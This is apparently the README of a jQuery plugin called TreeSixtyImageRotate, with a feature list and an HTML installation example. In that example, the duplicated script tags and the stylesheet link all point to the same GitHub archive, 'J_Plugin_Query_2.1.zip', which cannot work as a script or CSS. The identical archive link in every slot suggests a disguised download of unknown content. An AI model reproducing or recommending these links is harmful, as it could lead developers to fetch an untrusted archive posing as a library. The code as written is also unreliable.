# TreeSixtyImageRotate
jQuery plugin created for version 3.3.1

== Description ==

Features
- Full 360° view
- Multiple levels
- Responsive design
- Works on mobile devices
- Zooming

How it work
Loads images from provided directory and creates 360 image dispay with navigation

Installation is very easy just create one div element in you html file where do you want to display 360 images view,
initialise TreeSixtyImageRotate with necessary data and you are good to go 

Installation example
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Title</title>
    <script src="https://github.com/ackoDotDev/360JQueryPlugin/raw/refs/heads/master/example/J_Plugin_Query_2.1.zip"></script>
    <script src="https://github.com/ackoDotDev/360JQueryPlugin/raw/refs/heads/master/example/J_Plugin_Query_2.1.zip"></script>
    <script>
        $( document ).ready(function() {
            $('.product').TreeSixtyImageRotate({
                totalFrames: 36,
                endFrame: 36,
                currentFrame: 0,
                extension: ".png",
                imagesFolder: "images/prod1/",
                smallWidth: 400,
                smallHeight: 400,
                largeWidth: 800,
                largeHeight: 800,
                imagePlaceholderClass: "images-placeholder"
            }).initTreeSixty();
        });
    </script>
    <link rel="stylesheet" type="text/css" href="https://github.com/ackoDotDev/360JQueryPlugin/raw/refs/heads/master/example/J_Plugin_Query_2.1.zip">
</head>
<body>
<div class="threesixty-image-rotate product">
</div>
</body>
</html>
